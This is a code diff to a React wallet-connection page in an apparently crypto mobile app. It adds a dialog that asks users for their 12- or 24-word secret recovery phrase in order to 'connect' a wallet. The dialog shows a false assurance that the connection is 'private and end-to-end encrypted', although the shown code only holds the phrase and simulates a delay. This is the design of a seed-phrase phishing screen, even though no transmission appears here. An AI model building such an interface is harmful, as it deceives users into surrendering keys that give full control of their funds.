@@ -1,7 +1,10 @@
 import { MobileLayout } from "@/components/layout/mobile-layout";
-import { ArrowLeft, ChevronRight, Search } from "lucide-react";
+import { ArrowLeft, ChevronRight, Search, ShieldCheck, Lock } from "lucide-react";
 import { Link, useLocation } from "wouter";
 import { Input } from "@/components/ui/input";
+import { Textarea } from "@/components/ui/textarea";
+import { Button } from "@/components/ui/button";
+import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import { useState } from "react";
 
 const WALLETS = [
@@ -19,17 +22,30 @@ const WALLETS = [
 export default function ConnectWallet() {
   const [_, setLocation] = useLocation();
   const [search, setSearch] = useState("");
+  const [selectedWallet, setSelectedWallet] = useState<typeof WALLETS[0] | null>(null);
+  const [phrase, setPhrase] = useState("");
+  const [isConnecting, setIsConnecting] = useState(false);
 
   const filteredWallets = WALLETS.filter(w => 
     w.name.toLowerCase().includes(search.toLowerCase()) || 
     w.url.toLowerCase().includes(search.toLowerCase())
   );
 
-  const handleConnect = (walletName: string) => {
-    // In a real app, this would trigger the specific wallet connection logic
-    // For now, we'll just go back to the wallet page which simulates a connected state
-    // You might want to pass a state or query param to indicate success
-    setLocation("/wallet"); 
+  const handleWalletClick = (wallet: typeof WALLETS[0]) => {
+    setSelectedWallet(wallet);
+    setPhrase("");
+  };
+
+  const handleConnect = () => {
+    if (!phrase) return;
+    
+    setIsConnecting(true);
+    // Simulate connection delay
+    setTimeout(() => {
+      setIsConnecting(false);
+      setSelectedWallet(null);
+      setLocation("/wallet"); 
+    }, 2000);
   };
 
   return (
@@ -61,7 +77,7 @@ export default function ConnectWallet() {
             {filteredWallets.map((wallet) => (
               <button 
                 key={wallet.name}
-                onClick={() => handleConnect(wallet.name)}
+                onClick={() => handleWalletClick(wallet)}
                 className="flex items-center gap-4 p-4 bg-white rounded-2xl border border-gray-100 shadow-sm hover:shadow-md hover:border-blue-100 active:scale-[0.99] transition-all text-left group"
               >
                 <div className={`w-14 h-14 rounded-2xl ${wallet.color} flex items-center justify-center text-white font-bold text-xl shadow-sm shrink-0 group-hover:scale-105 transition-transform`}>
@@ -84,6 +100,50 @@ export default function ConnectWallet() {
             )}
           </div>
         </div>
+
+        <Dialog open={!!selectedWallet} onOpenChange={(open) => !open && setSelectedWallet(null)}>
+          <DialogContent className="sm:max-w-md rounded-2xl w-[90%]">
+            <DialogHeader className="flex flex-col items-center text-center pt-4">
+              {selectedWallet && (
+                <div className={`w-16 h-16 rounded-2xl ${selectedWallet.color} flex items-center justify-center text-white font-bold text-2xl shadow-md mb-4`}>
+                  {selectedWallet.name[0]}
+                </div>
+              )}
+              <DialogTitle className="text-xl font-bold">
+                Connect {selectedWallet?.name}
+              </DialogTitle>
+            </DialogHeader>
+            
+            <div className="space-y-4 py-2">
+              <div className="space-y-2">
+                <p className="text-sm text-gray-500 text-center px-4">
+                  Enter your secret recovery phrase to connect your wallet securely.
+                </p>
+                <Textarea 
+                  placeholder="Enter your 12 or 24 word recovery phrase..." 
+                  className="min-h-[120px] resize-none bg-gray-50 border-gray-200 focus:border-primary rounded-xl p-4"
+                  value={phrase}
+                  onChange={(e) => setPhrase(e.target.value)}
+                />
+              </div>
+
+              <div className="space-y-3 pt-2">
+                <Button 
+                  className="w-full h-12 rounded-xl font-bold text-base"
+                  onClick={handleConnect}
+                  disabled={isConnecting || !phrase}
+                >
+                  {isConnecting ? "Connecting..." : "Connect to Wallet"}
+                </Button>
+                
+                <div className="flex items-center justify-center gap-1.5 text-xs text-gray-400">
+                  <Lock size={12} />
+                  <span>Connection is private and end-to-end encrypted.</span>
+                </div>
+              </div>
+            </div>
+          </DialogContent>
+        </Dialog>
       </div>
     </MobileLayout>
   );
